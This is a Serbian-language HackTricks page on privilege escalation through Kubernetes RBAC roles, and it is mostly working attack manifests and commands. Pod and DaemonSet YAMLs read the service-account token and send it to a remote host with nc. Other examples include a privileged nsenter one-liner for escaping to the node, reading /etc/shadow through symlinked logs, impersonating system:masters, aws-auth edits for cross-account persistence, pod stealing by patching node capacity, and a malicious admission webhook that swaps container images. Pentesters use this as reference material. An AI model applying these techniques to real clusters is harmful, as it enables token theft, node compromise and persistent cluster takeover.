# Zloupotreba Uloga/ClusterUloga u Kubernetesu

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ovde mo쬰te prona캖i neke potencijalno opasne konfiguracije Uloga i ClusterUloga.\
Zapamtite da mo쬰te dobiti sve podr쬬ne resurse sa `kubectl api-resources`

## **Pove캖anje privilegija**

Pod pove캖anjem privilegija se podrazumeva umetnost dobijanja **pristupa drugom principalu** unutar klastera **sa razli캜itim privilegijama** (unutar kubernetes klastera ili ka spoljnim oblakom) od onih koje ve캖 imate, u Kubernetesu postoje osnovno **4 glavne tehnike za pove캖anje privilegija**:

* Biti u mogu캖nosti da se **predstavljate** kao drugi korisnik/grupe/SA sa boljim privilegijama unutar kubernetes klastera ili ka spoljnim oblakom
* Biti u mogu캖nosti da **kreirate/izmenite/izvr코ite podove** gde mo쬰te **prona캖i ili povezati SA** sa boljim privilegijama unutar kubernetes klastera ili ka spoljnim oblakom
* Biti u mogu캖nosti da **캜itate tajne** jer se tokeni SA 캜uvaju kao tajne
* Biti u mogu캖nosti da **pobegnete na 캜vor** iz kontejnera, gde mo쬰te ukrasti sve tajne kontejnera koji se izvr코avaju na 캜voru, akreditive 캜vora i dozvole 캜vora unutar oblaka u kojem se izvr코ava (ako postoje)
* Peta tehnika koja zaslu쬿je pomen je mogu캖nost **pokretanja port-forward** u podu, jer mo쬰te imati pristup interesantnim resursima unutar tog poda.

### Pristup bilo kom resursu ili glagolu (Zvezdica)

**Zvezdica (*) daje dozvolu nad bilo kojim resursom sa bilo kojim glagolom**. Koristi je administratori. Unutar ClusterUloge, to zna캜i da napada캜 mo쬰 zloupotrebiti bilo koju prostoriju u klasteru.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pristupite bilo kojem resursu sa odre캠enim glagolom

U RBAC-u, odre캠ene dozvole predstavljaju zna캜ajne rizike:

1. **`create`:** Omogu캖ava stvaranje bilo kog resursa klastera, 코to mo쬰 dovesti do eskalacije privilegija.
2. **`list`:** Omogu캖ava prikazivanje svih resursa, potencijalno otkrivaju캖i osetljive podatke.
3. **`get`:** Dozvoljava pristupanje tajnama iz servisnih naloga, 코to predstavlja sigurnosnu pretnju.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Kreiranje Poda - Kra캠a Tokena

Napada캜 sa dozvolama za kreiranje poda mo쬰 pridru쬴ti privilegovanu servisnu korisni캜ku nalogu podu i ukrasti token kako bi se predstavljao kao servisna korisni캜ka nalog. Efektivno pove캖ava privilegije na nalogu.

Primer poda koji 캖e ukrasti token servisne korisni캜ke naloge `bootstrap-signer` i poslati ga napada캜u:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Kreiranje i izlazak iz Poda

Slede캖e ozna캜ava sve privilegije koje kontejner mo쬰 imati:

* **Privilegovan pristup** (onemogu캖avanje za코tite i postavljanje mogu캖nosti)
* **Onemogu캖avanje hostIPC i hostPid** namespace-ova koji mogu pomo캖i u eskalaciji privilegija
* **Onemogu캖avanje hostNetwork** namespace-a, pru쬬ju캖i pristup kra캠i privilegija oblaka i bolji pristup mre쬬ma
* **Montiranje /hosts unutar kontejnera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Kreirajte pod sa:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jedan red iz [ovog tvita](https://twitter.com/mauilion/status/1129468485480751104) sa nekim dodacima:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sada kada mo쬰te da pobegnete na 캜vor, proverite tehnike post-eksploatacije na slede캖im stranicama:

#### Skrivenost

Verovatno 쬰lite da budete **skriveniji**, na slede캖im stranicama mo쬰te videti na 코ta biste mogli da pristupite ako kreirate pod koji omogu캖ava samo neke od navedenih privilegija u prethodnom 코ablonu:

* **Privilegovani + hostPID**
* **Samo privilegovani**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Primer kako kreirati/zloupotrebiti prethodno privilegovane konfiguracije podova mo쬰te prona캖i na_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Kreiranje poda - Pre캠ite na cloud

Ako mo쬰te **kreirati** pod (i opciono servisni nalog), mo쬯a 캖ete mo캖i da **dobijete privilegije u cloud okru쬰nju** dodeljivanjem cloud uloga podu ili servisnom nalogu, a zatim pristupanjem tome.\
Osim toga, ako mo쬰te kreirati **pod sa mre쬹im imenikom doma캖ina**, mo쬰te **ukrasti IAM** ulogu instance 캜vora.

Za vi코e informacija pogledajte:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Kreiranje/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs i Cronjobs**

Mogu캖e je zloupotrebiti ove dozvole da biste **kreirali novi pod** i stekli privilegije kao u prethodnom primeru.

Slede캖i yaml **kreira daemonset i izvla캜i token SA** unutar poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Izvr코avanje u Podovima**

**`pods/exec`** je resurs u Kubernetesu koji se koristi za **izvr코avanje komandi u ljusci unutar poda**. To omogu캖ava izvr코avanje komandi unutar kontejnera ili dobijanje ljuske unutar poda.

Stoga je mogu캖e **u캖i u pod i ukrasti token SA**, ili u캖i u privilegovan pod, pobe캖i na 캜vor i ukrasti sve tokene podova na 캜voru i (zlo)upotrebiti 캜vor:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ova dozvola omogu캖ava **preusmeravanje jednog lokalnog porta na jedan port u odre캠enom podu**. Ovo je namenjeno da bi se omogu캖ilo jednostavno otklanjanje gre코aka aplikacija koje se izvr코avaju unutar poda, ali napada캜 mo쬰 zloupotrebiti ovu dozvolu da bi dobio pristup zanimljivim (poput baza podataka) ili ranjivim aplikacijama (veb?) unutar poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Begovi sa mogu캖no코캖u pisanja /var/log/ direktorijuma

Kao 코to je [**nazna캜eno u ovom istra쬴vanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ako mo쬰te pristupiti ili kreirati pod sa **montiranim direktorijumom hosts `/var/log/`**, mo쬰te **pobe캖i iz kontejnera**.\
Ovo je zato 코to kada **Kube-API poku코ava da dobije logove** kontejnera (koriste캖i `kubectl logs <pod>`), on zahteva datoteku `0.log` poda koriste캖i `/logs/` endpoint **Kubelet** servisa.\
Kubelet servis izla쬰 `/logs/` endpoint koji zapravo **izla쬰 `/var/log` fajl sistem kontejnera**.

Stoga, napada캜 sa **pristupom pisanja u /var/log/ folder** kontejnera mo쬰 zloupotrebiti ovo pona코anje na 2 na캜ina:

* Modifikovanjem `0.log` fajla svog kontejnera (obi캜no sme코tenog u `/var/logs/pods/namespace_pod_uid/container/0.log`) da bude **simboli캜ka veza koja pokazuje na `/etc/shadow`** na primer. Zatim, mo캖i 캖ete da izfiltrirate fajl sa lozinkama doma캖ina koriste캖i:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ako napada캜 kontroli코e bilo koji princip sa **dozvolama za 캜itanje `nodes/log`**, jednostavno mo쬰 napraviti **simboli캜ku vezu** u `/host-mounted/var/log/sym` ka `/`, i kada pristupi `https://<gateway>:10250/logs/sym/`, prikaza캖e se lista fajlova na korenskom fajl sistemu hosta (promena simboli캜ke veze mo쬰 omogu캖iti pristup fajlovima).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorija i automatizovani eksploit mogu se prona캖i na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Zaobila쬰nje za코tite samo za 캜itanje na hostpath-u <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ako imate sre캖e i visoko privilegovani kapacitet `CAP_SYS_ADMIN` je dostupan, jednostavno mo쬰te ponovo montirati folder kao rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Zaobila쬰nje za코tite hostPath readOnly <a href="#zaobila쬰nje-hostpath-readonly-za코tite" id="zaobila쬰nje-hostpath-readonly-za코tite"></a>

Kao 코to je navedeno u [**ovom istra쬴vanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), mogu캖e je zaobi캖i za코titu:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
맚o je trebalo da spre캜i curenje kao prethodni, umesto kori코캖enja hostPath monta쬰, koristi se PersistentVolume i PersistentVolumeClaim da bi se montirala fascikla doma캖ina u kontejneru sa mogu캖no코캖u pisanja:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonacija privilegovanih naloga**

Sa privilegijom [**impersonacije korisnika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), napada캜 mo쬰 se predstaviti kao privilegovani nalog.

Jednostavno koristite parametar `--as=<korisni캜ko_ime>` u `kubectl` komandi za impersonaciju korisnika, ili `--as-group=<grupa>` za impersonaciju grupe:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ili koristite REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Prikazivanje tajni

Dozvola za **prikazivanje tajni mo쬰 omogu캖iti napada캜u da zapravo pro캜ita tajne** pristupaju캖i REST API endpointu:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### 캛itanje tajne - brute-forcing token ID-jeva

Iako napada캜u u posjedu tokena sa dozvolom 캜itanja treba ta캜no ime tajne da bi je koristio, za razliku od 코ire privilegije _**listanje tajni**_, i dalje postoje ranjivosti. Podrazumijevani servisni nalozi u sistemu mogu biti nabrojani, svaki povezan sa tajnom. Ove tajne imaju strukturu imena: stati캜ki prefiks pra캖en nasumi캜nim alfanumeri캜kim tokenom od pet karaktera (isklju캜uju캖i odre캠ene karaktere) prema [izvornom kodu](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token se generi코e iz ograni캜enog skupa od 27 karaktera (`bcdfghjklmnpqrstvwxz2456789`), umjesto punog alfanumeri캜kog opsega. Ovo ograni캜enje smanjuje ukupan broj mogu캖ih kombinacija na 14.348.907 (27^5). Stoga, napada캜 bi mogao izvesti napad brute-force metodom kako bi otkrio token u nekoliko sati, 코to potencijalno mo쬰 dovesti do eskalacije privilegija pristupom osjetljivim servisnim nalozima.


### Zahtjevi za potpisivanje sertifikata

Ako imate glagole **`create`** u resursu `certificatesigningrequests` (ili barem u `certificatesigningrequests/nodeClient`). Mo쬰te **kreirati** novi CeSR za **novi 캜vor**.

Prema [dokumentaciji, mogu캖e je automatski odobriti ove zahtjeve](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), pa u tom slu캜aju **ne trebate dodatne dozvole**. Ako ne, morali biste biti u mogu캖nosti odobriti zahtjev, 코to zna캜i a쬿riranje u `certificatesigningrequests/approval` i `approve` u `signers` sa resursnim imenom `<signerNameDomain>/<signerNamePath>` ili `<signerNameDomain>/*`

**Primjer uloge** sa svim potrebnim dozvolama je:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Dakle, sa odobrenim CSR-om za novi 캜vor, mo쬰te **zloupotrebiti** posebne dozvole 캜vorova kako biste **ukrali tajne** i **pove캖ali privilegije**.

U [**ovom postu**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**ovom**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) je konfiguracija GKE K8s TLS Bootstrap-a konfigurisana sa **automatskim potpisivanjem** i zloupotrebljena je kako bi se generisali akreditivi za novi K8s 캜vor, a zatim zloupotrebili kako bi se pove캖ale privilegije kra캠om tajni.\
Ako **imate pomenute privilegije, mo쬰te uraditi istu stvar**. Imajte na umu da prvi primer zaobilazi gre코ku koja spre캜ava novi 캜vor da pristupi tajnama unutar kontejnera jer **캜vor mo쬰 pristupiti samo tajnama kontejnera koji su mu montirani**.

Na캜in da zaobi캠ete ovo je jednostavno **kreiranje akreditiva 캜vora za ime 캜vora na kojem je montiran kontejner sa interesantnim tajnama** (ali samo proverite kako to uraditi u prvom postu):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Principali koji mogu izmeniti **`configmaps`** u kube-system namespace-u na EKS (potrebno je biti u AWS) klasterima mogu dobiti privilegije klaster admina preko prepisivanja **aws-auth** configmap-e.\
Potrebni glagoli su **`update`** i **`patch`**, ili **`create`** ako configmap nije kreiran:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Mo쬰te koristiti **`aws-auth`** za **trajnost** daju캖i pristup korisnicima iz **drugih naloga**.

Me캠utim, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne radi iz drugog naloga**. Ali zapravo `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` radi ako umesto samo imena stavite ARN klastera.\
Da biste omogu캖ili rad `kubectl`-a, samo se pobrinite da **konfiguri코ete** kubeconfig rtve i u aws exec args dodajte `--profile other_account_role` tako da 캖e kubectl koristiti profil drugog naloga za dobijanje tokena i kontaktiranje AWS-a.
{% endhint %}

### Eskalacija u GKE

Postoje **2 na캜ina dodeljivanja K8s dozvola GCP principima**. U svakom slu캜aju, princip tako캠e mora imati dozvolu **`container.clusters.get`** da bi mogao prikupiti akreditive za pristup klasteru, ili 캖ete morati **generisati svoju vlastitu kubectl konfiguracionu datoteku** (pratite slede캖i link).

{% hint style="warning" %}
Kada razgovarate sa K8s API endpointom, **GCP autenti캜ki token 캖e biti poslat**. Zatim, GCP, putem K8s API endpointa, prvo 캖e **proveriti da li princip** (po e-po코ti) **ima pristup unutar klastera**, a zatim 캖e proveriti da li ima **pristup putem GCP IAM**.\
Ako je **bilo koji** od njih **ta캜an**, dobi캖e **odgovor**. Ako **nije**, dobi캖e **gre코ku** koja sugeri코e da se **dodaju dozvole putem GCP IAM**.
{% endhint %}

Prvi na캜in je kori코캖enje **GCP IAM-a**, dozvole K8s imaju svoje **ekvivalentne GCP IAM dozvole**, i ako princip ima to, mo캖i 캖e ga koristiti.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi na캜in je **dodeljivanje K8s dozvola unutar klastera** identifikovanjem korisnika putem njegove **e-po코te** (uklju캜eni su GCP servisni nalozi).

### Kreiranje tokena za servisne naloge

Principali koji mogu **kreirati TokenRequests** (`serviceaccounts/token`) Kada razgovaraju sa K8s API endpointom SAs (informacije od [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Principali koji mogu **`update`** ili **`patch`** **`pods/ephemeralcontainers`** mogu dobiti **izvr코enje koda na drugim podovima**, i potencijalno **iza캖i** na svoj 캜vor dodavanjem privremenog kontejnera sa privilegovanim securityContext-om.

### ValidatingWebhookConfigurations ili MutatingWebhookConfigurations

Principali sa bilo kojim od glagola `create`, `update` ili `patch` nad `validatingwebhookconfigurations` ili `mutatingwebhookconfigurations` mogu mo캖i **kreirati jednu od takvih webhook konfiguracija** kako bi mogli **pove캖ati privilegije**.

Za [`mutatingwebhookconfigurations` primer pogledajte ovaj odeljak ovog posta](./#malicious-admission-controller).

### Eskalacija

Kao 코to mo쬰te pro캜itati u slede캖em odeljku: [**Ugra캠ena prevencija privilegovanog pove캖anja**](./#built-in-privileged-escalation-prevention), princip ne mo쬰 a쬿rirati niti kreirati uloge ili klaster uloge bez da sam ima te nove dozvole. Osim ako ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**.\
Tada mo쬰 a쬿rirati/kreirati nove uloge, klaster uloge sa boljim dozvolama od onih koje ima.

### Proxy 캜vorova

Principali sa pristupom **`nodes/proxy`** podresursu mogu **izvr코iti kod na podovima** putem Kubelet API-ja (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Vi코e informacija o Kubelet autentifikaciji na ovoj stranici:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Imate primer kako dobiti [**RCE razgovaraju캖i ovla코캖eno sa Kubelet API-jem ovde**](../pentesting-kubernetes-services.md#kubelet-rce).

### Brisanje podova + 캜vorovi koji nisu raspore캠eni

Principali koji mogu **brisati podove** (`delete` glagol nad `pods` resursom), ili **izbaciti podove** (`create` glagol nad `pods/eviction` resursom), ili **promeniti status poda** (pristup `pods/status`) i mogu **onemogu캖iti druge 캜vorove** (pristup `nodes/status`) ili **brisati 캜vorove** (`delete` glagol nad `nodes` resursom) i imaju kontrolu nad podom, mogu **ukrasti podove sa drugih 캜vorova** tako da se izvr코avaju na kompromitovanom 캜voru i napada캜 mo쬰 **ukrasti tokene** sa tih podova.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usluga (CVE-2020-8554)

Principali koji mogu **izmeniti** **`services/status`** mogu postaviti polje `status.loadBalancer.ingress.ip` da bi iskoristili **neispravljenu CVE-2020-8554** i pokrenuli **MiTM napade na klaster**. Ve캖ina mitigacija za CVE-2020-8554 spre캜ava samo usluge sa spoljnim IP adresama (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status 캜vorova i podova

Principali sa dozvolama za **`update`** ili **`patch`** nad `nodes/status` ili `pods/status`, mogu izmeniti oznake da bi uticali na sprovo캠enje ograni캜enja raspore캠ivanja.

## Ugra캠ena prevencija privilegovanog eskaliranja

Kubernetes ima [ugra캠eni mehanizam](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) za spre캜avanje privilegovanog eskaliranja.

Ovaj sistem osigurava da **korisnici ne mogu pove캖ati svoje privilegije izmenom uloga ili vezivanjem uloga**. Sprovo캠enje ove pravila se vr코i na API nivou, pru쬬ju캖i za코titu 캜ak i kada RBAC autorizator nije aktivan.

Pravilo propisuje da **korisnik mo쬰 samo kreirati ili a쬿rirati ulogu ako poseduje sve dozvole koje uloga obuhvata**. Osim toga, opseg korisnikovih postoje캖ih dozvola mora se poklapati sa opsegom uloge koju poku코ava da kreira ili izmeni: ili 코irom klastera za ClusterRoles ili ograni캜eno na isti namespace (ili 코irom klastera) za Roles.

{% hint style="warning" %}
Postoji izuzetak od prethodnog pravila. Ako princip ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**, mo쬰 pove캖ati privilegije uloga i cluster uloga 캜ak i bez sopstvenih dozvola.
{% endhint %}

### **Dobijanje i izmena RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**O캜igledno je da je ova tehnika ranije funkcionisala, ali prema mojim testovima vi코e ne radi iz istog razloga obja코njenog u prethodnom odeljku. Ne mo쬰te kreirati/izmeniti vezivanje uloge da biste sebi ili drugom SA dali privilegije ako ih ve캖 nemate.**
{% endhint %}

Privilegija za kreiranje Rolebindings omogu캖ava korisniku da **vezuje uloge za servisni nalog**. Ova privilegija mo쬰 potencijalno dovesti do privilegovanog eskaliranja jer **omogu캖ava korisniku da ve쬰 administratorske privilegije za kompromitovani servisni nalog.**

## Ostali napadi

### Aplikacija za sporedni proxy

Podrazumevano nema enkripcije u komunikaciji izme캠u podova. Obostrana autentifikacija, pod do poda.

#### Kreiranje aplikacije za sporedni proxy <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Kreirajte svoj .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Uredite svoj .yaml fajl i dodajte otkomentarisane linije:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Vidi zapise proxy-ja:
```bash
kubectl logs app -C proxy
```
Vi코e informacija na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zlonamerni kontroler prijema

Kontroler prijema **presre캖e zahteve ka Kubernetes API serveru** pre trajnog 캜uvanja objekta, ali **nakon 코to je zahtev autentifikovan** **i autorizovan**.

Ako napada캜 nekako uspe da **ubaci kontroler za mutaciju prijema**, bi캖e u mogu캖nosti da **izmeni ve캖 autentifikovane zahteve**. Time mo쬰 potencijalno da ostvari privilegije i 캜e코캖e da se trajno zadr쬴 u klasteru.

**Primer sa [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Proverite status da biste videli da li je spreman:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Zatim implementirajte novi pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kada vidite gre코ku `ErrImagePull`, proverite ime slike pomo캖u jednog od slede캖ih upita:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Kao 코to mo쬰te videti na gornjoj slici, poku코ali smo da pokrenemo sliku `nginx`, ali kona캜na izvr코ena slika je `rewanthtammana/malicious-image`. 맚a se upravo desilo!!?

#### Tehni캜ki detalji <a href="#heading-technicalities" id="heading-technicalities"></a>

Skripta `./deploy.sh` uspostavlja mutiraju캖i webhook admission kontroler, koji menja zahteve ka Kubernetes API-ju prema konfiguracionim linijama, uti캜u캖i na posmatrane rezultate:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Gornji isje캜ak zamjenjuje prvu sliku kontejnera u svakom podu s `rewanthtammana/malicious-image`.

## Najbolje prakse

